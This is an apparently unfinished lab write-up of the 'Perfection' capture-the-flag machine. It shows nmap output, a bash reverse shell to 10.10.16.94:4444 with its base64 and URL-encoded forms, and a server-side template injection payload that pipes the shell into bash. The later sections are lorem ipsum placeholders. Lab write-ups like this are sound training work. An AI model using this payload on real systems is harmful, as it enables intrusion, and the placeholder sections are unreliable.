---
aliases:
  - Perfection
Date: 2024-03-15
Platform: 
Category: 
Difficulty: 
tags: 
Status: 
IP: 10.10.11.253
---

# Perfection

![img][../../../Images/Pwned-Perfection.png]


## Improved skills
- Exploit **SSTI** vulnerability 

## Used tools
- nmap
- gobuster
- Burpsuite
- hashcat
---

# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sT -sV -p- perfection.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-15 18:47 EDT
Nmap scan report for perfection.htb (10.10.11.253)
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds

```

---
# Vulnerability Assessment
## Server Side Template Injection (SSTI)
This machine is vulnerable to **[SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)** vulnerability.
// TODO insert Vulnerability assessment
# Exploitation


```bash
┌──(kali㉿kali)-[~/Machine/Perfection]
└─$ hURL -B "bash -i >& /dev/tcp/10.10.16.94/4444 0>&1"

Original       :: bash -i >& /dev/tcp/10.10.16.94/4444 0>&1
base64 ENcoded :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA+JjE=
```

```bash
┌──(kali㉿kali)-[~/Machine/Perfection]
└─$ hURL -U "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA+JjE="

Original    :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA+JjE=
URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi45NC80NDQ0IDA%2BJjE%3D
```
### Exploit

In place reverseshelle put the revesershell encoded
```bash
payload 
a%0A<%25%3dsystem("echo+<reverseshelle>|+base64+-d+|+bash");%25>1
```


---

# Lateral Movement to user
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Lateral Movement vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Privilege Escalation
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Privilege Escalation vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Trophy & Loot
user.txt

root.txt